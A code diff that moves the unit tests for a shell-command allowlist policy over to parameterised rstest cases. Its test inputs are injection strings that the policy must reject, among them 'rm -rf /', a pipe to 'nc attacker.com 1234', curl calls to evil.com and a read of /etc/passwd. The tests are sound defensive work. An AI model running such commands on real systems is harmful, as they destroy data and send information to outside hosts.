@@ -370,6 +370,7 @@ fn truncate_output(output: &str) -> (String, bool) {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use rstest::rstest;
 
     #[test]
     fn policy_deny_all_blocks_everything() {
@@ -401,42 +402,33 @@ mod tests {
         assert!(!policy.allows(""));
     }
 
-    #[test]
-    fn policy_allowlist_rejects_shell_metacharacter_injection() {
+    #[rstest]
+    #[case("echo hello; rm -rf /", "semicolon chaining")]
+    #[case("echo hello | nc attacker.com 1234", "pipe")]
+    #[case("cat /etc/passwd && curl https://evil.com", "logical AND")]
+    #[case("ls /nonexistent || curl https://evil.com", "logical OR")]
+    #[case("echo `whoami`", "backtick substitution")]
+    #[case("echo $(id)", "dollar substitution")]
+    #[case("cat <(curl https://evil.com)", "process substitution")]
+    #[case("echo pwned > /tmp/exploit", "redirection")]
+    #[case("echo hello & curl evil.com &", "background execution")]
+    #[case("echo hello; (curl evil.com)", "subshell")]
+    #[case("echo hello\nrm -rf /", "newline injection")]
+    #[case("echo ${PATH}", "brace expansion")]
+    #[case("echo hello || ! rm -rf /", "negation operator")]
+    fn allowlist_rejects_metacharacter(#[case] command: &str, #[case] desc: &str) {
         let policy = BashPolicy::Allowlist(vec!["echo".into(), "ls".into(), "cat".into()]);
+        assert!(!policy.allows(command), "should reject {desc}: {command}");
+    }
 
-        // Semicolon chaining.
-        assert!(!policy.allows("echo hello; rm -rf /"));
-        // Pipe.
-        assert!(!policy.allows("echo hello | nc attacker.com 1234"));
-        // Logical AND.
-        assert!(!policy.allows("cat /etc/passwd && curl https://evil.com"));
-        // Logical OR.
-        assert!(!policy.allows("ls /nonexistent || curl https://evil.com"));
-        // Command substitution (backticks).
-        assert!(!policy.allows("echo `whoami`"));
-        // Command substitution ($()).
-        assert!(!policy.allows("echo $(id)"));
-        // Process substitution.
-        assert!(!policy.allows("cat <(curl https://evil.com)"));
-        // Redirection.
-        assert!(!policy.allows("echo pwned > /tmp/exploit"));
-        // Background execution.
-        assert!(!policy.allows("echo hello & curl evil.com &"));
-        // Subshell.
-        assert!(!policy.allows("echo hello; (curl evil.com)"));
-        // Newline injection.
-        assert!(!policy.allows("echo hello\nrm -rf /"));
-        // Brace expansion with command.
-        assert!(!policy.allows("echo ${PATH}"));
-        // Negation operator.
-        assert!(!policy.allows("echo hello || ! rm -rf /"));
-
-        // But clean commands still work.
-        assert!(policy.allows("echo hello world"));
-        assert!(policy.allows("ls -la /tmp"));
-        assert!(policy.allows("cat /etc/hostname"));
-        assert!(policy.allows("echo 'safe with spaces'"));
+    #[rstest]
+    #[case("echo hello world")]
+    #[case("ls -la /tmp")]
+    #[case("cat /etc/hostname")]
+    #[case("echo 'safe with spaces'")]
+    fn allowlist_allows_clean_commands(#[case] command: &str) {
+        let policy = BashPolicy::Allowlist(vec!["echo".into(), "ls".into(), "cat".into()]);
+        assert!(policy.allows(command), "should allow: {command}");
     }
 
     #[test]
